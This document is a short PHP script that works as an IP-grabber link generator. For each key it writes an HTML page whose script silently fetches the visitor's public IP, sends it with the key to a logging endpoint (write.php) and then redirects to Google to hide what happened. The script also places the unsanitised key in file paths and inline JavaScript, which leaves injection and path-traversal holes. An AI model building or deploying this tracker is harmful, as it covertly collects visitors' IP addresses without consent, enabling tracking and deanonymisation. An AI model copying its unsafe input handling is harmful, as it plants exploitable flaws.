<?php
// Check if the key parameter is set in the URL
if (isset($_GET['key'])) {

    // Get the key from the URL
    $key = $_GET['key'];

    // Create HTML content
    $htmlContent = '<script>
        async function getPublicIP() {
            try {
                const response = await fetch("https://api64.ipify.org?format=json");
                const data = await response.json();
                return data.ip;
            } catch (error) {
                console.error("Error getting public IP:", error);
                return null;
            }
        }

        // Function to send data to write.php
        async function sendDataToPHP(ip, key) {
            try {
                const response = await fetch(`write.php?key=${key}&ip=${ip}`);
                const result = await response.text();
                console.log(result);
            } catch (error) {
                console.error("Error sending data to PHP:", error);
            }
        }

        // Main execution
        async function main() {
            const publicIP = await getPublicIP();
            if (publicIP) {
                sendDataToPHP(publicIP, "' . $key . '");
            }
            window.location.href = "https://www.google.com/";
        }

        window.onload = main;
    </script>';

    $txtContent = 'Updating every 5 seconds.';

    // Specify file paths
    $htmlFilePath = $key . '.html';
    $txtFilePath = $key . '.txt';

    // Write content to HTML file
    file_put_contents($htmlFilePath, $htmlContent);

    // Write content to TXT file
    file_put_contents($txtFilePath, $txtContent);

    echo 'Files generated successfully!';
} else {
    echo 'Please provide a key parameter in the URL.';
}
?>
